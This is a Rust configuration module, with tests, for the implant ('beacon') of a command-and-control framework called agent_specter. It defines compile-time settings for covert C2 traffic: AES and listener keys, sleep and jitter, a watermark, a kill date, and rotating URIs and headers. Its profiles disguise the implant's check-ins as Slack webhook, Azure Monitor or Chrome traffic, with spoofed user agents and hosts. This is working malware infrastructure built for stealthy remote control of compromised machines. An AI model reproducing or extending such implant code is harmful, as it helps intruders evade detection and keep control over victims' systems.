//! Build-time configuration: no_std types + the module generated by
//! build.rs from the per-build config JSON (see build/render.rs for the
//! contract with the agent_specter Go plugin).
//!
//! The beacon never parses anything at runtime: everything below is const,
//! injected at compile time — the same contract as the original Config.h,
//! with JSON as the exchange format (decision 2026-10-22).

/// URI/rotation behavior shared by the GET (heartbeat) and POST (task)
/// transactions.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Rotation {
    Sequential,
    Random,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Encoding {
    Base64,
    Base64Url,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Placement {
    Cookie,
    Header,
    Body,
}

/// How the beacon transports its check-in metadata (id, sysinfo).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct MetadataTransport {
    pub format: Encoding,
    pub mask: bool,
    pub placement: Placement,
    pub name: &'static str,
}

/// How the beacon wraps task output in the POST body.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct OutputTransport {
    pub format: Encoding,
    pub mask: bool,
    pub placement: Placement,
}

/// How the listener wraps server data (tasks, staged payloads) in its
/// responses.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct OutputWrap {
    pub format: Encoding,
    pub mask: bool,
    pub placement: Placement,
    pub prepend: &'static str,
    pub append: &'static str,
}

/// The generated constants, one build config per beacon. With SPT_CONFIG
/// unset (dev, CI), the default config mirrors profiles/default.json.
pub mod generated {
    use super::{Encoding, OutputTransport, Placement, Rotation};
    include!(concat!(env!("OUT_DIR"), "/config_gen.rs"));
}

// List constants are packed (data + offsets + accessor) so the image holds
// no absolute fat pointers — see build/render.rs packed_list.
pub use generated::{
    get_header, get_uri, host, post_header, post_uri, AES_KEY, BEACON_ID_HEADER, GET_HEADERS_COUNT,
    GET_HEADERS_DATA, GET_METADATA_NAME, GET_SERVER_OUTPUT_APPEND, GET_SERVER_OUTPUT_PREPEND,
    GET_URIS_COUNT, GET_URIS_DATA, HOSTS_COUNT, HOSTS_DATA, JITTER_MS, KILL_EPOCH, LISTENER_KEY,
    POST_CLIENT_OUTPUT, POST_HEADERS_COUNT, POST_HEADERS_DATA, POST_METADATA_NAME,
    POST_SERVER_OUTPUT_APPEND, POST_SERVER_OUTPUT_PREPEND, POST_URIS_COUNT, POST_URIS_DATA,
    ROTATION, SLEEP_MS, USER_AGENT, WATERMARK,
};

#[cfg(test)]
mod tests {
    use super::*;

    /// The default build (SPT_CONFIG unset) must mirror profiles/default.json
    /// and the original Config.h fallbacks: localhost C2, zero key, disabled
    /// killswitch.
    #[test]
    fn default_build_semantics() {
        assert_eq!(AES_KEY, [0u8; 32]);
        assert_eq!(LISTENER_KEY, [0u8; 16]);
        assert_eq!(SLEEP_MS, 30000);
        assert_eq!(JITTER_MS, 2000);
        assert_eq!(WATERMARK, 0);
        assert_eq!(KILL_EPOCH, 0);
        assert_eq!(HOSTS_COUNT, 1);
        assert_eq!(host(0), "localhost:443");
        assert_eq!(ROTATION, Rotation::Sequential);
        assert_eq!(BEACON_ID_HEADER, "X-Request-Id");
        assert!(USER_AGENT.starts_with("Mozilla/5.0 ("));
        assert_eq!(GET_URIS_COUNT, 2);
        assert_eq!(get_uri(0), "/api/v1/status");
        assert_eq!(get_uri(1), "/api/v1/health");
        assert_eq!(GET_METADATA_NAME, "session");
        assert_eq!(GET_SERVER_OUTPUT_PREPEND, "{\"data\":\"");
        assert_eq!(POST_METADATA_NAME, "X-Correlation-Id");
        assert_eq!(POST_CLIENT_OUTPUT.placement, Placement::Body);
        assert_eq!(POST_SERVER_OUTPUT_PREPEND, "{\"result\":\"");
        assert_eq!(POST_SERVER_OUTPUT_APPEND, "\"}");
    }

    #[test]
    fn user_agent_is_a_known_chrome_string() {
        // Exact value from profiles/default.json, pinned.
        assert_eq!(
            USER_AGENT,
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        );
    }
}

/// The render module is shared with build.rs (same file) and tested here on
/// the host: schema validation, rendering, manifest generation.
#[cfg(test)]
#[path = "../build/render.rs"]
mod render;

#[cfg(test)]
mod render_tests {
    use super::render::*;
    // Explicit imports instead of `use std::prelude::v1::*;`: the no_std crate
    // already has the core prelude, and two glob imports make `panic`
    // ambiguous.
    use std::format;
    use std::string::String;
    use std::string::ToString;

    fn config_with_profile(profile_json: &str) -> String {
        format!(
            "{{\"aes_key\":\"{}\",\"listener_key\":\"{}\",\"sleep_ms\":1000,\"jitter_ms\":100,\"watermark\":42,\"kill_epoch\":0,\"profile\":{profile_json}}}",
            "ab".repeat(32),
            "cd".repeat(16)
        )
    }

    fn read_profile(name: &str) -> String {
        std::fs::read_to_string(format!("../../profiles/{name}.json"))
            .unwrap_or_else(|e| panic!("cannot read profiles/{name}.json: {e}"))
    }

    /// The three real profiles shipped with the original project must all
    /// parse and render.
    #[test]
    fn all_shipped_profiles_parse() {
        for name in ["default", "azure-monitor", "slack-webhook"] {
            let json = config_with_profile(&read_profile(name));
            let gen = generate(&json).unwrap_or_else(|e| panic!("{name}: {e}"));
            assert!(gen.rust_source.contains("pub const AES_KEY: [u8; 32]"));
        }
    }

    #[test]
    fn slack_profile_semantics() {
        let json = config_with_profile(&read_profile("slack-webhook"));
        let model = parse_config(&json).expect("slack profile");
        assert_eq!(model.profile.rotation, Rotation::Random);
        assert_eq!(model.profile.beacon_id_header, "X-Slack-Request-Timestamp");
        assert_eq!(model.profile.hosts, ["hooks.slack.com:443"]);
        assert_eq!(
            model.profile.user_agent,
            "Slackbot 1.0 (+https://api.slack.com/robots)"
        );
    }

    #[test]
    fn azure_profile_semantics() {
        let json = config_with_profile(&read_profile("azure-monitor"));
        let model = parse_config(&json).expect("azure profile");
        assert_eq!(model.profile.rotation, Rotation::Sequential);
        assert_eq!(model.profile.hosts, ["management.azure.com:443"]);
        assert_eq!(
            model.profile.user_agent,
            "Azure-Monitor/2.0 (Windows NT 10.0; x64)"
        );
    }

    #[test]
    fn build_parameters_flow_through() {
        let json = config_with_profile(&read_profile("default"))
            .replace("\"sleep_ms\":1000", "\"sleep_ms\":61000")
            .replace("\"watermark\":42", "\"watermark\":305419896")
            .replace("\"kill_epoch\":0", "\"kill_epoch\":1767225600");
        let model = parse_config(&json).expect("config");
        assert_eq!(model.sleep_ms, 61000);
        assert_eq!(model.watermark, 305419896);
        assert_eq!(model.kill_epoch, 1767225600);
        assert_eq!(model.aes_key[0], 0xab);
        assert_eq!(model.aes_key[31], 0xab);
        assert_eq!(model.listener_key[0], 0xcd);
        assert_eq!(model.listener_key[15], 0xcd);
    }

    // --- strict validation: a malformed config must fail the build ---

    fn expect_err(json: &str, needle: &str) {
        let err = parse_config(json).expect_err("config must be rejected");
        assert!(
            err.contains(needle),
            "error `{err}` should mention `{needle}`"
        );
    }

    #[test]
    fn rejects_wrong_key_length() {
        let mut json = config_with_profile(&read_profile("default"));
        json = json.replace(&"ab".repeat(32), "abcd");
        expect_err(&json, "32 bytes");
    }

    #[test]
    fn rejects_wrong_listener_key_length() {
        let mut json = config_with_profile(&read_profile("default"));
        json = json.replace(&"cd".repeat(16), "cdef");
        expect_err(&json, "16 bytes");
    }

    #[test]
    fn rejects_bad_hex() {
        let mut json = config_with_profile(&read_profile("default"));
        json = json.replace(&"ab".repeat(32), &"zz".repeat(32));
        expect_err(&json, "aes_key");
    }

    #[test]
    fn rejects_unknown_rotation() {
        let profile = read_profile("default").replace("sequential", "sometimes");
        expect_err(&config_with_profile(&profile), "rotation");
    }

    #[test]
    fn rejects_unknown_encoding() {
        let profile = read_profile("default").replace("base64url", "hex");
        expect_err(&config_with_profile(&profile), "encoding");
    }

    #[test]
    fn rejects_empty_hosts() {
        let profile = read_profile("default").replace("[\"localhost:443\"]", "[]");
        expect_err(&config_with_profile(&profile), "hosts");
    }

    #[test]
    fn rejects_bad_version() {
        let profile = read_profile("default").replace("\"version\": 2", "\"version\": 3");
        expect_err(&config_with_profile(&profile), "version");
    }

    #[test]
    fn rejects_missing_field() {
        let profile = read_profile("default").replace("\"user_agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\",", "");
        expect_err(&config_with_profile(&profile), "user_agent");
    }

    #[test]
    fn cookie_placement_requires_name() {
        let mut profile: serde_json::Value =
            serde_json::from_str(&read_profile("default")).expect("default profile");
        // Remove the cookie name: get.client.metadata.name.
        profile["get"]["client"]["metadata"]
            .as_object_mut()
            .expect("metadata object")
            .remove("name");
        expect_err(&config_with_profile(&profile.to_string()), "cookie");
    }

    #[test]
    fn default_config_json_wraps_the_default_profile() {
        // The exact JSON the build script uses when SPT_CONFIG is unset.
        let model = parse_config(&default_config_json()).expect("default config");
        assert_eq!(model.aes_key, [0u8; 32]);
        assert_eq!(model.sleep_ms, 30000);
        assert_eq!(model.jitter_ms, 2000);
        assert_eq!(model.watermark, 0);
        assert_eq!(model.kill_epoch, 0);
        assert_eq!(model.profile.hosts, ["localhost:443"]);
    }

    #[test]
    fn manifest_lists_legitimate_strings_only() {
        let json = config_with_profile(&read_profile("default"));
        let gen = generate(&json).expect("config");
        assert!(gen.strings_manifest.contains(&"localhost:443".to_string()));
        assert!(gen
            .strings_manifest
            .iter()
            .any(|s| s.starts_with("Mozilla/5.0")));
        assert!(gen.strings_manifest.contains(&"session".to_string()));
        // Config parameters are not strings.
        assert!(!gen.strings_manifest.iter().any(|s| s.contains("30000")));
    }

    #[test]
    fn rendered_source_references_only_known_types() {
        let json = config_with_profile(&read_profile("default"));
        let gen = generate(&json).expect("config");
        for banned in ["serde", "String", "Vec", "format!"] {
            assert!(
                !gen.rust_source.contains(banned),
                "generated source must not reference `{banned}`"
            );
        }
    }
}
